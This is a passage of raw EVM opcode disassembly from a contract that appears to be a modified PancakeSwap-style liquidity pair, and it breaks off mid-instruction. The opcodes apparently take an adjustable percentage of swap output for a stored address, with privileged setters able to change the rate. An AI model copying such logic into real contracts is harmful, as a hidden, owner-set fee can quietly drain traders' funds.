JUMPDEST DUP1 PUSH4 0x22C0D9F EQ PUSH2 0x200 JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x28E JUMPI DUP1 PUSH4 0x902F1AC EQ PUSH2 0x30B JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x343 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x80 DUP2 LT ISZERO PUSH2 0x216 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH1 0x40 DUP4 ADD CALLDATALOAD AND SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH1 0x80 DUP2 ADD PUSH1 0x60 DUP3 ADD CALLDATALOAD PUSH5 0x100000000 DUP2 GT ISZERO PUSH2 0x24D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 ADD DUP4 PUSH1 0x20 DUP3 ADD GT ISZERO PUSH2 0x25F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP2 DUP5 PUSH1 0x1 DUP4 MUL DUP5 ADD GT PUSH5 0x100000000 DUP4 GT OR ISZERO PUSH2 0x281 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SWAP1 SWAP3 POP SWAP1 POP PUSH2 0x69E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x296 PUSH2 0xC7A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2D0 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x2B8 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x2FD JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x313 PUSH2 0xC9D JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP5 DUP6 AND DUP2 MSTORE SWAP3 SWAP1 SWAP4 AND PUSH1 0x20 DUP4 ADD MSTORE PUSH4 0xFFFFFFFF AND DUP2 DUP4 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 RETURN JUMPDEST PUSH2 0x36F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x359 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0xCC7 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x38B PUSH2 0xCDE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3BD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xCED JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xD76 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x36F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x40D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xD7C JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xE16 JUMP JUMPDEST PUSH2 0x43D PUSH2 0xE3A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x3E5 PUSH2 0xE3F JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x471 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xE45 JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xE57 JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xE5D JUMP JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH2 0xE63 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xEB1 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4EA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x11AF JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0x11C1 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x518 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x11C7 JUMP JUMPDEST PUSH2 0x54E PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x53E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x11D9 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH2 0x38B PUSH2 0x157D JUMP JUMPDEST PUSH2 0x38B PUSH2 0x158C JUMP JUMPDEST PUSH2 0x296 PUSH2 0x159B JUMP JUMPDEST PUSH2 0x36F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x595 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x15BD JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0x15CA JUMP JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x5C9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x15D0 JUMP JUMPDEST PUSH2 0x38B PUSH2 0x1739 JUMP JUMPDEST PUSH2 0x38B PUSH2 0x1748 JUMP JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x5FF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x1757 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x650 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1957 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x676 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x1BA6 JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0x1BC3 JUMP JUMPDEST PUSH2 0x28C PUSH2 0x1BC9 JUMP JUMPDEST PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x6E7 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 SSTORE DUP5 ISZERO ISZERO DUP1 PUSH2 0x6FA JUMPI POP PUSH1 0x0 DUP5 GT JUMPDEST PUSH2 0x735 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x274E PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x740 PUSH2 0xC9D JUMP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP8 LT DUP1 ISZERO PUSH2 0x765 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP7 LT JUMPDEST PUSH2 0x7B6 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E53554646494349454E545F4C495155494449545900 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP12 MUL DUP2 PUSH2 0x7C9 JUMPI INVALID JUMPDEST DIV DUP11 SUB SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP12 MUL DUP2 PUSH2 0x7DE JUMPI INVALID JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD SWAP3 SWAP1 SWAP2 DIV DUP13 SUB SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND SWAP2 DUP2 AND SWAP1 DUP12 AND DUP3 EQ DUP1 ISZERO SWAP1 PUSH2 0x81E JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP12 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO JUMPDEST PUSH2 0x865 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x13 PUSH1 0x24 DUP3 ADD MSTORE PUSH19 0x50616E63616B653A20494E56414C49445F544F PUSH1 0x68 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP13 ISZERO PUSH2 0x876 JUMPI PUSH2 0x876 DUP3 DUP13 DUP7 PUSH2 0x1D29 JUMP JUMPDEST DUP12 ISZERO PUSH2 0x887 JUMPI PUSH2 0x887 DUP2 DUP13 DUP6 PUSH2 0x1D29 JUMP JUMPDEST DUP9 ISZERO PUSH2 0x942 JUMPI DUP11 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x84800812 CALLER DUP7 DUP7 DUP15 DUP15 PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE PUSH1 0x20 ADD DUP6 DUP2 MSTORE PUSH1 0x20 ADD DUP5 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP5 DUP5 DUP3 DUP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP DUP1 DUP3 DUP5 CALLDATACOPY PUSH1 0x0 DUP2 DUP5 ADD MSTORE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND SWAP1 POP DUP1 DUP4 ADD SWAP3 POP POP POP SWAP7 POP POP POP POP POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x929 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x93D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP16 MUL DUP2 PUSH2 0x952 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP16 MUL DUP2 PUSH2 0x965 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP15 ISZERO PUSH2 0x986 JUMPI PUSH1 0x6 SLOAD PUSH2 0x986 SWAP1 DUP6 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH2 0x1D29 JUMP JUMPDEST DUP14 ISZERO PUSH2 0x9A4 JUMPI PUSH1 0x6 SLOAD PUSH2 0x9A4 SWAP1 DUP5 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP4 PUSH2 0x1D29 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9EA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x9FE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA14 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP10 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xA60 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA74 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA8A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP7 POP PUSH1 0x0 SWAP6 POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP6 AND DUP11 SWAP1 SUB DUP4 GT PUSH2 0xAB1 JUMPI PUSH1 0x0 PUSH2 0xAC0 JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 GT PUSH2 0xADD JUMPI PUSH1 0x0 PUSH2 0xAEC JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 GT DUP1 PUSH2 0xAFD JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST PUSH2 0xB38 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x26BE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xB6C PUSH2 0xB4E DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0xB60 DUP8 PUSH2 0x2710 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xB84 PUSH2 0xB4E DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 POP PUSH2 0xBB6 PUSH4 0x5F5E100 PUSH2 0xBAA PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP12 DUP2 AND SWAP1 DUP12 AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0xBC6 DUP4 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST LT ISZERO PUSH2 0xC06 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x50616E63616B653A204B PUSH1 0xB0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP PUSH2 0xC14 DUP5 DUP5 DUP9 DUP9 PUSH2 0x1F76 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE DUP1 DUP3 ADD DUP14 SWAP1 MSTORE PUSH1 0x60 DUP2 ADD DUP13 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP12 AND SWAP2 CALLER SWAP2 PUSH32 0xD78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822 SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG3 POP POP PUSH1 0x1 PUSH1 0x10 SSTORE POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP3 PUSH1 0x1 PUSH1 0x70 SHL DUP4 DIV SWAP1 SWAP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV PUSH4 0xFFFFFFFF AND SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xCD4 CALLER DUP5 DUP5 PUSH2 0x2139 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xD41 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x12 PUSH1 0x24 DUP3 ADD MSTORE PUSH18 0x2830B731B0B5B29D102327A92124A22222A7 PUSH1 0x71 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x8 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x9 DUP1 SLOAD SWAP4 SWAP1 SWAP5 AND SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0xE01 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0xDDC SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0xE0C DUP5 DUP5 DUP5 PUSH2 0x219B JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xC SLOAD DUP2 JUMP JUMPDEST PUSH1 0xD SLOAD DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xEAC JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x21 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x269D PUSH1 0x21 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0xEFC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 DUP2 SWAP1 SSTORE DUP1 PUSH2 0xF0C PUSH2 0xC9D JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 